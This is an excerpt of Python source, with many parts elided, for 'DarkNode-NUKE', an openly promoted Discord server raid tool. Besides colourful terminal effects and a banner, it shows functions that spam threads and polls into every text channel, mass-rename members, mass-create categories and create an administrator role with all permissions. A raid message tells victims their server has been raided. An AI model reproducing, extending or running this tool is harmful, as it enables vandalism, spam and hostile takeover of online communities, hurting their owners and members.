# ══════════════════════════════════════════════════════
#  DarkNode-NUKE  v1.0.0  --  by 6js3
#  discord.gg/cxi  |  github.com/6js3
# ══════════════════════════════════════════════════════
...
EMBED_CONFIG = {
    "title"      : "\U0001f480  __DARKNODE-NUKE__",
    "description": (
        "**Ton serveur vient d'\u00eatre raid par DARKNODE-NUKE.**\n\n"
        "_ _\n"
        "**> discord.gg/cxi**\n"
        "**> github.com/6js3**\n"
        "_ _\n"
    ...
    "footer"     : "discord.gg/cxi  |  github.com/6js3",
    "fields"     : [
        {"name": "\U0001f517 __Discord__", "value": "**discord.gg/cxi**", "inline": True},
        {"name": "\U0001f431 __Github__",  "value": "**github.com/6js3**",   "inline": True},
        {"name": "\u26a1 __Tool__",        "value": "**DARKNODE-NUKE v1.0.0**",       "inline": True},
    ],
}
...
BOT_PRESENCE = {"type": "playing", "text": "discord.gg/cxi"}
...
# Kept for existing code that references R1/R2/R3
R1 = "\033[38;2;255;0;100m"
R2 = "\033[38;2;100;255;0m"
R3 = "\033[38;2;0;180;255m"

DIM = "\033[38;2;200;200;255m"
D2  = "\033[38;2;170;170;230m"
WHT = "\033[38;2;255;255;255m"


# ── chroma ─────────────────────────────────────────────
def chroma(t, offset=0, speed=1.0):
    result = ""

    # Moving rainbow position
    shift = (time.time() * 45 * speed + offset) % 360
...
def r1(t):
    return f"{B}{chroma(t, 0, 1.0)}"


def r2(t):
    return chroma(t, 120, 1.0)


def r3(t):
    return chroma(t, 240, 1.0)


def dim(t):
    return chroma(t, 180, 0.6)


def wht(t):
    return f"{B}{chroma(t, 300, 0.8)}"


# ── terminal helpers ───────────────────────────────────
def _TW():
    return min(get_terminal_size((100, 30)).columns, 110)
...
def fx_glitch(text: str, n=5):
    ...
    for i in range(n):
        g = "".join(
            random.choice(gc) if random.random() < 0.18 else c
            for c in text
        )

        # Chroma instead of fixed red/blue
        col = chroma(g, i * 90)

        sys.stdout.write(f"\r  {B}{col}")
        sys.stdout.flush()
        time.sleep(.05)
    ...
    sys.stdout.write(f"\r  {B}{chroma(text)}\n")
    sys.stdout.flush()
...
def _log(p, m):
    ...
    _LOGS.append(
        f"[{datetime.now().strftime('%H:%M:%S')}] {_vis(m)}"
    )


def log_ok(m):
    _log(f"{B}{chroma('[+]', 0)}{RS}", m)


def log_err(m):
    _log(f"{B}{chroma('[-]', 180)}{RS}", m)


def log_warn(m):
    _log(f"{B}{chroma('[!]', 90)}{RS}", m)


def log_info(m):
    _log(f"{chroma('[*]', 270)}{RS}", m)
...
# Keep this because other code may use _SHADES
...
def _print_banner(bot_n="", srv_n="", members=0, animated=False):
    ...
    for i, (l, r) in enumerate(zip(_ART, _ART2)):
        ...
        # Entire banner line gets chroma
        combined = f"{l}  {r}"

        print(f"{B}{chroma(combined, i * 55, 0.8)}{RS}")
    ...
    if bot_n:
        info = (
            f"  {DIM}bot{RS} {r1(bot_n)}  "
            f"{D2}|{RS}  "
            f"{DIM}server{RS} {wht(srv_n or '-')}  "
            f"{D2}|{RS}  "
            f"{DIM}members{RS} {r1(str(members))}"
        )
...
def _print_menu(page: int = 1):
    ...
    print(f"\n  {R3}DARKNODE-NUKE v1.0.0{RS}  {DIM}Discord : 6js3{RS}")
...
async def thread_spam(sid):
    ...
    name = _ask("thread name  [enter = pub]") or "DARKNODE-NUKE | discord.gg/cxi"
...
async def poll_spam(sid):
    ...
    question = _ask("question  [enter = pub]") or f"Join DARKNODE-NUKE  |  {PUB_SHORT}"
    ...
    for chan in [c for c in g.channels if isinstance(c, discord.TextChannel)]:
        for i in range(count):
            try:
                ...
                poll.add_answer(text="discord.gg/cxi")
                poll.add_answer(text="github.com/6js3")
...
async def nick_all(sid):
    ...
    nick = _ask("nickname  [enter = pub]") or f".gg/cxi | {PUB_SHORT}"
    nv   = nick[:32] or None
...
async def get_admin(sid):
    ...
    try:
        ...
        role = await g.create_role(name="DARKNODE-NUKE ADMIN", colour=col, permissions=discord.Permissions.all())
...
async def category_creator(sid):
    ...
    name = _ask("name  [enter = pub]") or "DARKNODE-NUKE"
    fx_load("creating", 16, .020)
    t = time.perf_counter(); ok=fail=0
    for i in range(count):
...
def _boot():
    ...
    fx_load("initializing  DARKNODE-NUKE v1.0.0", 24, .016)
    print()
    _flag = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".darknode_first")
...
async def on_ready():
    ...
    while True:
        ...
        if raw.isdigit() and 41 <= int(raw) <= 60:
            ...
            log_info("github.com/6js3/darknode-nuke-tool")
            try:
                _star = os.path.join(os.path.dirname(os.path.abspath(__file__)), "star.PNG")
                if os.path.exists(_star): webbrowser.open(_star)
                time.sleep(.4)
